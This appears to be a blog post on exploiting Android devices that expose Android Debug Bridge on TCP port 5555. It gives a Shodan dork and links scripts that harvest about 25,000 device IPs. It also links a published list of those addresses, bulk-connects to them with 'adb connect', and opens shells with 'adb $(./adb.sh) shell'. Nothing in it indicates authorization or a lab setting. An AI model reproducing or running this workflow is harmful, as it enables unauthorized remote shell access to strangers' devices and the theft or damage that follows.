**What is ADB?**  
Android Debug Bridge (adb) is a versatile command-line tool that lets you communicate with a device. The adb command facilitates a variety of device actions, such as installing and debugging apps, and it provides access to a Unix shell that you can use to run a variety of commands on a device

Usually, developers connect to ADB service installed on Android devices using a USB cable, but it is also possible to use ADB wireless by enabling a daemon server at TCP port 5555 on the device.

Checking on [SHODAN](https://shodan.io/) using dork

```
android debug bridge product:”Android Debug Bridge”
```

Lets grab all the IP’s from shodan api

Made a one-liner bash script to do that for me

Add you api in the script before executing

`bash shodan_adb.sh`

You can get that [here](https://raw.githubusercontent.com/Mad-robot/exploiting-adb/master/shodan_adb.sh)

Got the json response of SHODAN search (total of 305 pages)

One-liner to grep all ips from them and make a single file

`bash grep_ip.sh > ip.txt`

You can get that [here](https://raw.githubusercontent.com/Mad-robot/exploiting-adb/master/grep_ip.sh)

Got around 25k  
Link to the list is [here](https://raw.githubusercontent.com/Mad-robot/exploiting-adb/master/ip.txt)

Next we need to add them to adb using `adb connect ip:port`

One-liner to add all the IP’s from ip.txt to adb

`bash adb_connect.sh`

You can get that [here](https://raw.githubusercontent.com/Mad-robot/exploiting-adb/master/add_adb.sh)

Accessing them  
To list all the connected adb use `adb devices`

![](https://miro.medium.com/max/1400/1*LKphiaScsVb9-nTlR_Mdkg.png)

Use the script `adb.sh` to list them in order to access them like it it [here](https://raw.githubusercontent.com/Mad-robot/exploiting-adb/master/adb.sh)

```
adb $(./adb.sh) shell
```
